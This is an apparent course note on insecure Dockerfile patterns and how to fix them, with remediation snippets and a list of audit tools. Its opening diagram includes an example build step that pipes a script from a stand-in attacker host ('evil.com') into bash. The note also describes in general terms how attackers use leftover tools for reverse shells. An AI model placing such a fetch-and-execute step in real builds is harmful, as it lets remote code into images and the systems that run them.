---
tags: [docker, misconfiguration, iac, container-security, build]
difficulty: intermediate
module: "38 - Container and Kubernetes Security"
topic: "38.08 Dockerfile Vulns"
---

# Dockerfile Security Misconfigurations

## Introduction
The `Dockerfile` is the blueprint for a container image. It dictates the base OS, the installed dependencies, the application code, and the runtime configuration. Because it operates as Infrastructure-as-Code (IaC), security flaws introduced in the Dockerfile are baked directly into the immutable image and subsequently deployed across the entire infrastructure. 

A poorly constructed Dockerfile dramatically increases the attack surface of the resulting container. It can provide attackers with necessary tools for post-exploitation, grant unnecessary privileges, expose sensitive data, and introduce vulnerable dependencies. Securing the container lifecycle begins intrinsically with securing the Dockerfile.

## The Anatomy of a Vulnerable Build

```mermaid
graph TD
    A[Vulnerable Dockerfile] --> B[Resulting Container Image]
    A1[FROM ubuntu:latest<br/>Untrusted/Bloated Base Image] --- A
    A2[USER root<br/>Running as root Default, but bad] --- A
    A3[RUN apt-get update && apt-get install -y curl netcat<br/>Installing Hacker Tools] --- A
    A4[COPY . /app<br/>Overly broad copy No .dockerignore] --- A
    A5[ENV DB_PASS=supersecret<br/>Hardcoded Secrets in ENV] --- A
    A6[RUN curl http://evil.com/setup.sh | bash<br/>Arbitrary remote execution] --- A
    A7[CMD python /app/main.py] --- A
    
    B1[- Massive attack surface full Ubuntu userland.<br/>- Contains netcat and curl perfect for reverse shells.<br/>- Source code, local config files, and potentially local secrets copied in.<br/>- DB_PASS visible to anyone who runs docker inspect.<br/>- Application runs as root. If app is compromised, container is compromised.] --- B
```

## Deep Dive: Common Misconfigurations and Exploitation

### 1. Running as Root (The Default Danger)
By default, Docker containers run their processes as the `root` user (UID 0) inside the container. 
*   **The Risk**: While container root is isolated from host root via namespaces, it is a weak boundary. If an attacker exploits an RCE vulnerability in the application running as root, they have full control over the container's userland. They can modify binaries, alter configurations, install new packages, and deeply embed persistence. Furthermore, many kernel exploits or container escape vectors require the attacker to have UID 0 inside the container to execute successfully.
*   **Exploitation**: An RCE immediately yields a `#` prompt. The attacker does not need to waste time performing Local Privilege Escalation (LPE) within the container.
*   **Remediation**: Always declare a non-root user and switch to it using the `USER` instruction before executing the application.
    ```dockerfile
    RUN groupadd -r appuser && useradd -r -g appuser appuser
    USER appuser
    CMD ["node", "server.js"]
    ```

### 2. Overly Broad COPY and Missing `.dockerignore`
Developers often use `COPY . /app` to quickly move all project files into the container.
*   **The Risk**: This instruction recursively copies everything from the build context (the directory containing the Dockerfile) into the image. This frequently includes:
    *   `.git` directories (exposing source code history and internal structure).
    *   `.env` files intended only for local development.
    *   Uncompiled assets or test scripts.
    *   Cloud provider credentials (`.aws/credentials`) accidentally left in the project folder.
*   **Exploitation**: An attacker who gains access to the container filesystem (via Directory Traversal, LFI, or RCE) can read these sensitive files. If the image is pushed to a public registry, anyone can pull the image and extract the secrets.
*   **Remediation**: Create a comprehensive `.dockerignore` file. Explicitly exclude `.git`, sensitive extensions, and local configuration files. Use specific `COPY` instructions rather than wildcards.

### 3. Using Untrusted or Bloated Base Images
Using `FROM ubuntu:latest` or `FROM node:latest` is common but highly insecure.
*   **The Risk**: 
    1.  **Bloat**: Full OS images contain hundreds of utilities (package managers, shells, networking tools) that the application does not need. This provides a massive toolkit for an attacker (Living off the Land).
    2.  **Vulnerabilities**: A larger footprint means more packages, which statistically guarantees a higher number of known CVEs in the base image.
    3.  **Mutability**: `latest` tags are not deterministic. Building the same Dockerfile tomorrow might pull a different underlying image, leading to irreproducible builds and unexpected security regressions.
*   **Exploitation**: An attacker with RCE utilizes the pre-installed `curl`, `wget`, `nc`, or `python` to download payloads, establish reverse shells, and perform internal network scanning.
*   **Remediation**: 
    *   Use highly minimal base images like Alpine Linux (`alpine`).
    *   Better yet, use Google's **Distroless** images, which contain *only* the application and its runtime dependencies, lacking even a shell (`/bin/sh`) or package manager.
    *   Pin image versions using SHA256 hashes instead of tags (e.g., `FROM ubuntu@sha256:abcdef...`).

### 4. Leaving Package Managers and Build Tools
A common pattern is installing dependencies, compiling code, and leaving the tools behind.
*   **The Risk**: Compilers (`gcc`, `make`) and package managers (`apt`, `apk`) are a gift to attackers. If an attacker compromises the container, they can easily compile exploits tailored to the environment or install additional tools required for lateral movement.
*   **Remediation**: Use **Multi-Stage Builds**. Compile the application in an initial "builder" stage that contains all the necessary tools. Then, copy *only* the compiled binary into a clean, minimal production stage.
    ```dockerfile
    # Stage 1: Builder
    FROM golang:1.19 AS builder
    WORKDIR /app
    COPY . .
    RUN go build -o main .

    # Stage 2: Production
    FROM alpine:latest
    WORKDIR /app
    COPY --from=builder /app/main .
    CMD ["./main"]
    ```

### 5. Hardcoding Secrets in Environment Variables
Using the `ENV` instruction to set database passwords, API keys, or tokens.
*   **The Risk**: `ENV` variables are permanently baked into the image metadata. Anyone with access to the Docker daemon or the registry can extract these secrets instantaneously by running `docker inspect <image_name>`.
*   **Remediation**: Never bake secrets into the image. Inject secrets at runtime using container orchestrators (Kubernetes Secrets, Docker Swarm Secrets), environment variable injection during `docker run`, or dedicated secret management solutions (HashiCorp Vault).

### 6. The `curl | bash` Anti-Pattern
Downloading and executing shell scripts directly from the internet during the build phase.
*   **The Risk**: If the remote server is compromised, or if the connection is intercepted (Man-in-the-Middle, DNS spoofing), malicious code will be seamlessly injected into the image build process.
*   **Remediation**: Avoid this pattern. If necessary, download the script, verify its SHA256 checksum against a known good hash, and then execute it.

## Auditing and Detection Tools

Identifying these misconfigurations manually is tedious and error-prone. Security teams rely on automated Static Application Security Testing (SAST) tools specifically designed for IaC and Dockerfiles.

1.  **Trivy**: A comprehensive vulnerability scanner by Aqua Security that scans container images and filesystems for OS vulnerabilities, application dependencies, and IaC misconfigurations.
2.  **Checkov**: A static code analysis tool by Prisma Cloud that scans IaC frameworks (Terraform, CloudFormation, Dockerfiles) against a vast library of security policies.
3.  **Hadolint**: A dedicated Dockerfile linter. It parses the Dockerfile into an Abstract Syntax Tree (AST) and applies rules based on best practices (e.g., ensuring `USER` is set, checking for valid `FROM` formats).
4.  **Snyk Container**: An enterprise tool that analyzes Dockerfiles and built images to identify vulnerabilities and suggest base image upgrades.

## Chaining Opportunities
*   [[06 - Application RCE in Containers]]: A bloated base image makes exploiting an application RCE exponentially easier, providing the attacker with immediate access to a shell and utilities.
*   [[07 - Container Escape — Kernel Exploits]]: If the Dockerfile runs the application as root and leaves compilation tools (`gcc`) inside the image, the attacker has everything they need to compile and execute a local kernel exploit for a container escape.
*   [[09 - Secrets in Docker Images]]: Overly broad `COPY` commands or improper use of `RUN` instructions are the primary cause of secret leakage within container layers.

## Related Notes
*   [[05 - Multi-Stage Builds and Distroless Images]]
*   [[01 - Introduction to Containerization]]
*   [[02 - Image Registries and Supply Chain Security]]
